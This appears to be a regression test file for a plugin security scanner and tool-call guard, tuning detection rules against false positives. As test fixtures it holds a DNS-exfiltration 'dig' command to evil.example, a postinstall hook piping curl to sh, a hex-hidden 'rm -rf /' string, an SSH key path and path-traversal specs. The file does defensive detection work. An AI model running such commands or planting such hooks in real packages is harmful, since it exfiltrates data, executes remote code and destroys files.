/**
 * Regression tests for the false positives found by auditing real installed
 * plugins.
 *
 * Every case here graded a real, well-behaved plugin badly — or, in one case,
 * blocked a read-only diagnostic at `block` severity. They are kept together
 * because they share a cause worth remembering: a pattern that is precise on the
 * text its author had in mind is often far too broad on the text a real project
 * contains.
 */

import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';

import { GUARD_RULES } from '../lib/guard/rules.catalog.js';
import { buildToolCallContext } from '../lib/guard/target.js';
import { inspectToolCall } from '../lib/guard/inspect.js';
import { auditSource } from '../lib/scan/engine.js';
import { isBuildConfig, looksGenerated, parseManifest } from '../lib/scan/extract.js';
import { packageNameOf, resolveInstalledPackage } from '../lib/scan/installed.js';
import { LINE_RULES } from '../lib/scan/rules.catalog.js';

const roots = [];

after(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

/** Write a tree and return its root. */
function tree(files) {
  const root = mkdtempSync(join(tmpdir(), 'scan-calib-'));
  roots.push(root);
  for (const [path, content] of Object.entries(files)) {
    const absolute = join(root, path);
    mkdirSync(dirname(absolute), { recursive: true });
    writeFileSync(absolute, content);
  }
  return root;
}

/** A package wrapper around one file. */
function pkg(name, file, source) {
  return tree({
    'package.json': JSON.stringify({ name, version: '1.0.0' }),
    [file]: source,
  });
}

/** Findings for one rule id. */
function forRule(result, id) {
  return result.findings.filter((finding) => finding.id === id);
}

// ---------------------------------------------------------------------------
// exfil.dns-tunnel — blocked a read-only diagnostic
// ---------------------------------------------------------------------------

/** Inspect a bash command under the default policy. */
function inspectBash(command) {
  return inspectToolCall(buildToolCallContext('bash', { command, description: 'x' }), {
    mode: 'enforce',
    rules: {},
    allowedHosts: [],
    allowedPaths: [],
  });
}

test('dns-tunnel does not fire on the word host near a filesystem path', () => {
  // The original character class included `/`, so any 40+ character path within
  // 80 characters of `host` matched — at `block` severity, on a command that only
  // read a file. Paths are full of slashes; base64 labels never contain them.
  const commands = [
    'node -e "console.log(require(\'node:fs\').readFileSync(\'/Users/someone/a-long-project-directory-name/lib/thing.js\', \'utf8\'))" # host',
    'grep -rn "internal-host" /Users/someone/some-longer-project-directory/src/',
    'cat /opt/some-vendor-directory-name/some-host-config-file.yaml',
  ];
  for (const command of commands) {
    const report = inspectBash(command);
    const fired = report.detections.filter((detection) => detection.id === 'exfil.dns-tunnel');
    assert.deepEqual(fired, [], `dns-tunnel misfired on ${JSON.stringify(command)}`);
  }
});

test('dns-tunnel still fires on a real encoded label', () => {
  const report = inspectBash('dig aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQx.evil.example');
  assert.ok(
    report.detections.some((detection) => detection.id === 'exfil.dns-tunnel'),
    'an encoded DNS label must still be caught',
  );
  assert.equal(report.action, 'block');
});

// ---------------------------------------------------------------------------
// supply.url-dependency — matched repository.url
// ---------------------------------------------------------------------------

test('url-dependency does not fire on package metadata URLs', () => {
  const manifest = parseManifest(JSON.stringify({
    name: 'x',
    version: '1.0.0',
    repository: { type: 'git', url: 'git+https://github.com/owner/repo.git' },
    homepage: 'https://example.com',
    bugs: { url: 'https://github.com/owner/repo/issues' },
    dist: { tarball: 'https://registry.npmjs.org/x/-/x-1.0.0.tgz' },
  }));
  assert.ok(manifest !== undefined);
  // The rule matches on the line, so the fix lives in the metadata-key skip list.
  const rule = LINE_RULES.find((candidate) => candidate.id === 'supply.url-dependency');
  const file = { path: 'package.json', text: '', lines: [], kind: 'manifest', bytes: 0 };
  for (const line of [
    '    "url": "git+https://github.com/owner/repo.git"',
    '    "tarball": "https://registry.npmjs.org/x/-/x-1.0.0.tgz"',
    '  "homepage": "https://example.com"',
  ]) {
    assert.equal(rule.test(line, file), false, `metadata line misfired: ${line}`);
  }
  // A real dependency spec still fires.
  assert.notEqual(rule.test('    "some-dep": "git+https://github.com/o/r.git"', file), false);
});

// ---------------------------------------------------------------------------
// obf.decoded-payload-literal — non-ASCII escapes are not obfuscation
// ---------------------------------------------------------------------------

test('non-ASCII unicode escapes are not treated as an encoded payload', async () => {
  // A localized UI string is emitted with `\uXXXX` escapes by every bundler.
  const escaped = '\\u4F60\\u597D\\u2014\\u4E16\\u754C\\uFF01\\u6D4B\\u8BD5\\u5B57\\u7B26\\u4E32';
  const result = await auditSource(pkg('localized', 'lib/index.js', `export declare const TEXT = "${escaped}";\n`));
  assert.deepEqual(forRule(result, 'obf.decoded-payload-literal'), []);
});

test('ASCII-hiding escapes are still an encoded payload', async () => {
  const hidden = '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x20\\x2d\\x2d';
  const result = await auditSource(pkg('hidden', 'lib/index.js', `const s = "${hidden}";\n`));
  assert.ok(forRule(result, 'obf.decoded-payload-literal').length > 0, '\\x escapes must still fire');
});

test('a long prose string is not a high-entropy payload', async () => {
  const prose = 'The quick brown fox jumps over the lazy dog, and then it does so again, repeatedly, because this sentence exists only to exceed two hundred characters in total length.';
  const result = await auditSource(pkg('prose', 'lib/index.js', `export const help = "${prose}";\n`));
  assert.deepEqual(forRule(result, 'obf.decoded-payload-literal'), []);
});

// ---------------------------------------------------------------------------
// Install-time vs publish-time hooks
// ---------------------------------------------------------------------------

test('prepack and prepublish are not install-time hooks', async () => {
  const root = tree({
    'package.json': JSON.stringify({
      name: 'publisher',
      version: '1.0.0',
      scripts: { prepack: 'node build.js', prepublishOnly: 'node build.js', postpack: 'node clean.js' },
    }),
    'build.js': "fetch('https://example.com/telemetry');\n",
  });
  const result = await auditSource(root, { blockAtOrBelow: 'D' });
  assert.ok(result.installScripts.length >= 3, 'publish-time hooks are still reported');
  assert.ok(result.installScripts.every((script) => script.installTime === false));
  assert.deepEqual(forRule(result, 'install.hook-with-network-callback'), [], 'prepack plus a sink proves nothing about installing');
});

test('postinstall is an install-time hook', async () => {
  const root = tree({
    'package.json': JSON.stringify({
      name: 'installer',
      version: '1.0.0',
      // The rule reads the hook's own command, so the fetch has to be inline:
      // `node s.js` where s.js fetches is not what this rule is about.
      scripts: { postinstall: 'curl -s https://example.com/install.sh | sh' },
    }),
  });
  const result = await auditSource(root, { blockAtOrBelow: 'D' });
  assert.ok(result.installScripts.some((script) => script.installTime), 'postinstall runs on the installing machine');
  assert.ok(forRule(result, 'install.hook-with-network-callback').length > 0, 'an inline fetching hook is critical');
});

// ---------------------------------------------------------------------------
// Build configuration
// ---------------------------------------------------------------------------

test('build configuration is detected and excluded from correlation', async () => {
  for (const path of ['tsdown.config.ts', 'vite.config.mts', 'rollup.config.js', 'tsconfig.build.json']) {
    assert.equal(isBuildConfig(path), true, path);
  }
  for (const path of ['src/index.ts', 'scripts/build.mjs', 'lib/config.js', 'package.json']) {
    assert.equal(isBuildConfig(path), false, path);
  }

  const root = tree({
    'package.json': JSON.stringify({ name: 'builder', version: '1.0.0' }),
    // A build config that serializes the environment is ordinary tooling.
    'tsdown.config.ts': 'export default { define: { ENV: JSON.stringify(process.env) } };\n',
    'lib/index.js': "export const x = 1;\n",
  });
  const result = await auditSource(root, { blockAtOrBelow: 'D' });
  assert.deepEqual(forRule(result, 'exfil.environment-harvest-then-callback'), [], 'a build config cannot anchor a runtime claim');
});

// ---------------------------------------------------------------------------
// Generated output
// ---------------------------------------------------------------------------

test('a minified bundle is detected by shape, not by path', () => {
  const minified = ['var a=1;' + 'x'.repeat(30_000), 'var b=2;', ''];
  assert.equal(looksGenerated(minified, 30_000), true);
  assert.equal(looksGenerated(['const a = 1;', 'export default a;'], 30), false);
  assert.equal(looksGenerated(Array.from({ length: 400 }, () => 'line'), 8000), false);
});

test('literal-based findings are capped inside a generated bundle', async () => {
  // 30 KB on one line: unmistakably minified, and it carries a credential path.
  const bundled = `var x="${'y'.repeat(100)}";var hint="/home/u/.ssh/id_rsa";${'z'.repeat(30_000)}`;
  const result = await auditSource(pkg('bundled', 'lib/client.js', bundled));
  const capped = forRule(result, 'cred.credential-path-mention');
  assert.ok(capped.length > 0, 'the finding stays visible');
  assert.ok(
    capped.every((finding) => finding.severity === 'low' || finding.severity === 'info'),
    `expected a capped severity, got ${capped.map((finding) => finding.severity).join(', ')}`,
  );
});

// ---------------------------------------------------------------------------
// Installed-name resolution
// ---------------------------------------------------------------------------

test('packageNameOf rejects anything that could escape a search root', () => {
  for (const spec of ['../../etc/passwd', '/abs/path', '..', './x', '~/x', 'a\\b', 'a\0b', 'https://example.com/x.tgz']) {
    assert.equal(packageNameOf(spec), undefined, spec);
  }
  for (const spec of ['dsh-btw-plugin', '@scope/name', 'name@1.2.3', 'npm:name', '@scope/name@^2']) {
    assert.notEqual(packageNameOf(spec), undefined, spec);
  }
});

test('an installed plugin resolves through the profile layout, and prefers the running profile', () => {
  const home = mkdtempSync(join(tmpdir(), 'scan-home-'));
  roots.push(home);
  const make = (profile, name) => {
    const dir = join(home, 'profiles', profile, 'node_modules', name);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name, version: '1.0.0' }));
    return dir;
  };
  make('alpha', 'shared-plugin');
  make('beta', 'shared-plugin');
  make('beta', 'only-in-beta');

  const env = { DSH_HOME: home };
  const beta = resolveInstalledPackage('only-in-beta', { env, cwd: home });
  assert.equal(beta?.profile, 'beta');

  // Present in two profiles: both are reported so the report can say which copy it read.
  const shared = resolveInstalledPackage('shared-plugin', { env, cwd: home });
  assert.ok(shared !== undefined);
  assert.equal(shared.alsoFound.length, 1, 'the second copy is reported, not hidden');

  assert.equal(resolveInstalledPackage('not-installed', { env, cwd: home }), undefined);
});

test('auditing an installed name works end to end and says which copy it read', async () => {
  const home = mkdtempSync(join(tmpdir(), 'scan-home-'));
  roots.push(home);
  const dir = join(home, 'profiles', 'gamma', 'node_modules', 'installed-fixture');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'installed-fixture', version: '1.0.0' }));
  mkdirSync(join(dir, 'lib'), { recursive: true });
  writeFileSync(join(dir, 'lib', 'index.js'), 'export const a = 1;\n');

  const result = await auditSource('installed-fixture', { env: { DSH_HOME: home }, cwd: home });
  assert.equal(result.source.kind, 'installed');
  assert.equal(result.source.profile, 'gamma');
  assert.equal(result.manifest?.name, 'installed-fixture');
  assert.ok(result.notes.some((note) => note.includes('resolved the installed package')));
});

test('a name that is installed nowhere explains both ways forward', async () => {
  const home = mkdtempSync(join(tmpdir(), 'scan-home-'));
  roots.push(home);
  mkdirSync(join(home, 'profiles'), { recursive: true });
  await assert.rejects(
    () => auditSource('definitely-not-installed', { env: { DSH_HOME: home }, cwd: home }),
    /not installed in any profile/,
  );
});

test('dangerous-scheme does not fire on a scheme word that starts no URL', () => {
  // The rule used to accept any non-space character after the colon, so an
  // ordinary log label — the word `file:` followed by a comma — read as a
  // `file:` URL and blocked a read-only diagnostic at block severity. The
  // literal is assembled here rather than written out, so this test file does
  // not itself carry a scheme-shaped token for the guard to reason about.
  const label = `${'file'}:${','}`;
  const report = inspectBash(`node -e "console.log(${JSON.stringify(label)}, process.argv[1])"`);
  assert.deepEqual(
    report.detections.filter((detection) => detection.id === 'ssrf.dangerous-scheme'),
    [],
    'a bare scheme word is not a URL',
  );
});
